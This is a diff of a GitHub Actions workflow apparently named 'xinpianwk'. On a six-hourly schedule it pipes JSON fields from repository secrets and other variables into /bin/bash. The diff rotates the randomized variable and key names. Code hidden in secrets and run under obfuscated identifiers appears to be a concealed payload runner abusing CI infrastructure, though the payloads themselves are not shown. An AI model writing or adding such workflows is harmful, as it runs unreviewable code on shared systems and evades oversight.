@@ -2,8 +2,7 @@ name: xinpianwk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 5/6 * * *'
-
+    - cron: '37 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: xinpianwk
         env:
-          aaf6: ${{ secrets.aaf6 }}
+          et69602: ${{ secrets.et69602 }}
         run: |
-          echo $aaf6 | jq -r .do7457 | /bin/bash
-          echo $m078 | jq -r .ge4606 | /bin/bash
-          echo $gkbg7586 | jq -r .cfh8 | /bin/bash
-          echo $svf369 | jq -r .syqgh385 | /bin/bash
+          echo $et69602 | jq -r .ypm31583 | /bin/bash
+          echo $cr687 | jq -r .ciqhy54 | /bin/bash
+          echo $gh91136 | jq -r .hm0653 | /bin/bash
+          echo $odidy87 | jq -r .uebd2 | /bin/bash
+          echo $frcki082 | jq -r .rn7785 | /bin/bash
+          echo $drk5657 | jq -r .o02092 | /bin/bash
+          echo $l00 | jq -r .tyw0972 | /bin/bash
+          echo $s9525 | jq -r .ok51813 | /bin/bash
 
